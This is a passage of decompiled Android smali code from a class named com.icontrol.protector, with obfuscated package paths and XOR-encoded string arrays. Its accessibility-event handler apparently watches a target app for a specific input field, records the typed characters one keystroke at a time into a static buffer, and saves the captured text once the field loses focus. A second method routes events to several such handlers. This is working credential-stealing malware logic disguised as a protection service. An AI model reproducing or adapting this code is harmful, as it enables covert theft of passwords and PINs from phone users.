        0x65t
        -0x1et
        -0x79t
    .end array-data

    :array_7
    .array-data 1
        0x24t
        -0x15t
        -0x19t
    .end array-data

    :array_8
    .array-data 1
        -0x3at
        0x6bt
        0x45t
        0x52t
        -0xat
        -0x12t
        -0x14t
        0x22t
    .end array-data

    :array_9
    .array-data 1
        0x26t
        -0x2bt
        -0x34t
        0x1at
        -0x49t
        -0x6et
        -0x7ct
        -0x2bt
        0x21t
        -0x4t
        -0x80t
        0x48t
        -0x4dt
        -0x69t
        -0x17t
    .end array-data

    :array_a
    .array-data 1
        0x7dt
        -0x77t
        -0x47t
        0x2et
        -0x2et
        -0x5et
        -0x4ct
        -0x8t
    .end array-data

    :array_b
    .array-data 1
        -0x37t
        0x9t
        -0x2ct
    .end array-data

    :array_c
    .array-data 1
        -0x58t
        0x7at
        -0x50t
        0x4at
        0x5t
        -0x69t
        0x28t
        0x2at
    .end array-data

    :array_d
    .array-data 1
        -0xdt
        -0x29t
        0x70t
        -0x10t
        -0x4bt
        -0x4ft
        0x68t
        0x4ft
    .end array-data

    :array_e
    .array-data 1
        0x3et
        0x15t
        -0x3ft
    .end array-data

    :array_f
    .array-data 1
        0x56t
        0x6ct
        -0x4ft
        0x41t
        0x5ct
        0x64t
        0x16t
        0x20t
    .end array-data

    :array_10
    .array-data 1
        0x29t
        0x22t
        -0x12t
        0x3ft
    .end array-data

    :array_11
    .array-data 1
        0x41t
        0x5bt
        -0x62t
        0x5bt
        -0x56t
        0x5et
        0x44t
        -0x3t
    .end array-data
.end method

.method private static e(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 10

    .line 1
    sget-object v0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    invoke-static {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->j(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-nez v1, :cond_0

    return-void

    :cond_0
    const/4 v2, 0x1

    new-array v3, v2, [B

    const/16 v4, -0x31

    const/4 v5, 0x0

    aput-byte v4, v3, v5

    const/16 v4, 0x8

    new-array v6, v4, [B

    fill-array-data v6, :array_0

    invoke-static {v3, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    const/16 v6, 0x25

    const-string v7, ""

    if-eqz v3, :cond_1

    sget-boolean v3, Lcom/icontrol/protector/i;->a:Z

    if-nez v3, :cond_1

    new-array v3, v6, [B

    fill-array-data v3, :array_1

    new-array v8, v4, [B

    fill-array-data v8, :array_2

    invoke-static {v3, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v3, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    sput-boolean v2, Lcom/icontrol/protector/i;->a:Z

    sput-object v7, Lcom/icontrol/protector/i;->c:Ljava/lang/String;

    :cond_1
    new-array v3, v2, [B

    const/16 v8, 0x62

    aput-byte v8, v3, v5

    new-array v8, v4, [B

    fill-array-data v8, :array_3

    invoke-static {v3, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    const/4 v8, 0x3

    if-eqz v3, :cond_3

    sget-boolean v3, Lcom/icontrol/protector/i;->a:Z

    if-eqz v3, :cond_3

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v3

    if-ne v3, v2, :cond_3

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v3

    if-eqz v3, :cond_3

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v3

    invoke-interface {v3}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_3

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object p0

    invoke-interface {p0, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Ljava/lang/CharSequence;

    invoke-interface {p0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p0

    if-eqz p0, :cond_3

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v3

    if-lez v3, :cond_2

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v3

    sub-int/2addr v3, v2

    invoke-virtual {p0, v3}, Ljava/lang/String;->charAt(I)C

    move-result p0

    invoke-static {p0}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object p0

    goto :goto_0

    :cond_2
    move-object p0, v7

    :goto_0
    new-array v3, v8, [B

    fill-array-data v3, :array_4

    new-array v9, v4, [B

    fill-array-data v9, :array_5

    invoke-static {v3, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-nez v3, :cond_3

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v9, Lcom/icontrol/protector/i;->c:Ljava/lang/String;

    invoke-virtual {v3, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    sput-object p0, Lcom/icontrol/protector/i;->c:Ljava/lang/String;

    :cond_3
    new-array p0, v2, [B

    const/16 v3, -0x3c

    aput-byte v3, p0, v5

    new-array v3, v4, [B

    fill-array-data v3, :array_6

    invoke-static {p0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_4

    sget-boolean p0, Lcom/icontrol/protector/i;->a:Z

    if-eqz p0, :cond_4

    new-array p0, v6, [B

    fill-array-data p0, :array_7

    new-array v0, v4, [B

    fill-array-data v0, :array_8

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-nez p0, :cond_4

    sput-boolean v5, Lcom/icontrol/protector/i;->a:Z

    sget-object p0, Lcom/icontrol/protector/i;->c:Ljava/lang/String;

    new-array v0, v8, [B

    fill-array-data v0, :array_9

    new-array v1, v4, [B

    fill-array-data v1, :array_a

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p0

    const/16 v0, 0xf

    new-array v0, v0, [B

    fill-array-data v0, :array_b

    new-array v1, v4, [B

    fill-array-data v1, :array_c

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0, v7}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    sput-object p0, Lcom/icontrol/protector/i;->d:Ljava/lang/String;

    new-array p0, v6, [B

    fill-array-data p0, :array_d

    new-array v0, v4, [B

    fill-array-data v0, :array_e

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    sget-object v0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    new-array v1, v8, [B

    fill-array-data v1, :array_f

    new-array v3, v4, [B

    fill-array-data v3, :array_10

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    new-array v2, v2, [B

    const/16 v3, 0x33

    aput-byte v3, v2, v5

    new-array v3, v4, [B

    fill-array-data v3, :array_11

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object v0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    new-array v1, v8, [B

    fill-array-data v1, :array_12

    new-array v2, v4, [B

    fill-array-data v2, :array_13

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    sget-object v2, Lcom/icontrol/protector/i;->d:Ljava/lang/String;

    invoke-static {v0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    sget-object v0, Lcom/icontrol/protector/WorkServices;->n:Landroid/content/Context;

    const/4 v1, 0x4

    new-array v1, v1, [B

    fill-array-data v1, :array_14

    new-array v2, v4, [B

    fill-array-data v2, :array_15

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_4
    return-void

    nop

    :array_0
    .array-data 1
        -0x1t
        0x2ct
        0x7et
        -0x22t
        -0x9t
        0x72t
        0x7bt
        -0x7ft
    .end array-data

    :array_1
    .array-data 1
        -0x62t
        0x24t
        -0x7dt
        -0x5bt
        -0x28t
        0x3at
        -0x55t
        0x31t
        -0x6et
        0x22t
        -0x76t
        -0x5bt
        -0x36t
        0x2dt
        -0x44t
        0x37t
        -0x68t
        0x26t
        -0x65t
        -0x1et
        -0x7dt
        0x3dt
        -0x55t
        0x6ct
        -0x73t
        0x2at
        -0x63t
        -0x8t
        -0x32t
        0x3bt
        -0x43t
        0x27t
        -0x48t
        0x25t
        -0x66t
        -0x7t
        -0x40t
    .end array-data

    nop

    :array_2
    .array-data 1
        -0x3t
        0x4bt
        -0x12t
        -0x75t
        -0x47t
        0x54t
        -0x31t
        0x43t
    .end array-data

    :array_3
    .array-data 1
        0x52t
        -0x48t
        -0x6et
        0x10t
        -0x1dt
        -0x28t
        0x46t
        0x23t
    .end array-data

    :array_4
    .array-data 1
        0x3ft
        0x2at
        -0x78t
    .end array-data

    :array_5
    .array-data 1
        -0x23t
        -0x56t
        0x2at
        -0x66t
        0x30t
        -0x41t
        -0x7t
        0x62t
    .end array-data

    :array_6
    .array-data 1
        -0xat
        -0x4ct
        -0x32t
        0x79t
        -0x2at
        -0x5et
        -0x23t
        -0x61t
    .end array-data

    :array_7
    .array-data 1
        0x18t
        -0x45t
        -0x71t
        -0xct
        -0x55t
        -0x2t
        0x6ft
        0x11t
        0x14t
        -0x43t
        -0x7at
        -0xct
        -0x47t
        -0x17t
        0x78t
        0x17t
        0x1et
        -0x47t
        -0x69t
        -0x4dt
        -0x10t
        -0x7t
        0x6ft
        0x4ct
        0xbt
        -0x4bt
        -0x6ft
        -0x57t
        -0x43t
        -0x1t
        0x79t
        0x7t
        0x3et
        -0x46t
        -0x6at
        -0x58t
        -0x4dt
    .end array-data

    nop

    :array_8
    .array-data 1
        0x7bt
        -0x2ct
        -0x1et
        -0x26t
        -0x36t
        -0x70t
        0xbt
        0x63t
    .end array-data

    :array_9
    .array-data 1
        0x9t
        -0x3et
        0x23t
    .end array-data

    :array_a
    .array-data 1
        -0x15t
        0x42t
        -0x7ft
        -0x3t
        0x4at
        -0x59t
        -0xft
        0x7dt
    .end array-data

    :array_b
    .array-data 1
        -0x34t
        0x3dt
        0x53t
        0x5ft
        0x4at
        -0x5ft
        0x7et
        -0x7ft
        -0x35t
        0x14t
        0x1ft
        0xdt
        0x4et
        -0x5ct
        0x13t
    .end array-data

    :array_c
    .array-data 1
        -0x69t
        0x61t
        0x26t
        0x6bt
        0x2ft
        -0x6ft
        0x4et
        -0x54t
    .end array-data

    :array_d
    .array-data 1
        0x3ct
        0x60t
        0x59t
        -0x39t
        0xet
        -0x79t
        0x4et
        0x2dt
        0x30t
        0x66t
        0x50t
        -0x39t
        0x1ct
        -0x70t
        0x59t
        0x2bt
        0x3at
        0x62t
        0x41t
        -0x80t
        0x55t
        -0x80t
        0x4et
        0x70t
        0x3dt
        0x7bt
        0x5at
        -0x4at
        0x3t
        -0x74t
        0x5et
        0x2bt
        0x3at
        0x7dt
        0x6bt
        -0x7at
        0x4t
    .end array-data

    nop

    :array_e
    .array-data 1
        0x5ft
        0xft
        0x34t
        -0x17t
        0x6ft
        -0x17t
        0x2at
        0x5ft
    .end array-data

    :array_f
    .array-data 1
        -0x23t
        0x1ct
        -0x37t
    .end array-data

    :array_10
    .array-data 1
        -0x44t
        0x6ft
        -0x53t
        0x2bt
        0x4ft
        0x6t
        -0x4bt
        0x7t
    .end array-data

    :array_11
    .array-data 1
        0x6t
        0x6et
        0x52t
        -0x67t
        -0x26t
        0x32t
        0x7ct
        -0x15t
    .end array-data

    :array_12
    .array-data 1
        -0x60t
        0x7et
        -0xbt
    .end array-data

    :array_13
    .array-data 1
        -0x38t
        0x7t
        -0x7bt
        -0x31t
        -0x1t
        -0x51t
        -0x1ft
        -0x30t
    .end array-data

    :array_14
    .array-data 1
        -0x7dt
        -0x62t
        0x7ft
        -0x12t
    .end array-data

    :array_15
    .array-data 1
        -0x15t
        -0x19t
        0xft
        -0x76t
        -0x11t
        -0x6dt
        -0x22t
        -0x4bt
    .end array-data
.end method

.method public static f(Landroid/view/accessibility/AccessibilityEvent;Landroid/content/Context;)V
    .locals 1

    .line 1
    sget-boolean p1, Lcom/icontrol/protector/i;->b:Z

    if-nez p1, :cond_5

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result p1

    const/4 v0, 0x1

    if-eq p1, v0, :cond_4

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result p1

    const/16 v0, 0xe

    if-ne p1, v0, :cond_0

    goto :goto_0

    :cond_0
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result p1

    const/4 v0, 0x2

    if-ne p1, v0, :cond_1

    invoke-static {p0}, Lcom/icontrol/protector/i;->e(Landroid/view/accessibility/AccessibilityEvent;)V

    goto :goto_1

    :cond_1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result p1

    const/4 v0, 0x3

    if-ne p1, v0, :cond_2

    invoke-static {p0}, Lcom/icontrol/protector/i;->c(Landroid/view/accessibility/AccessibilityEvent;)V

    goto :goto_1

    :cond_2
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result p1

    const/4 v0, 0x4

    if-ne p1, v0, :cond_3

    invoke-static {p0}, Lcom/icontrol/protector/i;->d(Landroid/view/accessibility/AccessibilityEvent;)V

    goto :goto_1

    :cond_3
    invoke-static {p0}, Lcom/icontrol/protector/i;->a(Landroid/view/accessibility/AccessibilityEvent;)V

    goto :goto_1

    :cond_4
    :goto_0
    invoke-static {p0}, Lcom/icontrol/protector/i;->b(Landroid/view/accessibility/AccessibilityEvent;)V

    :cond_5
    :goto_1
    return-void
.end method
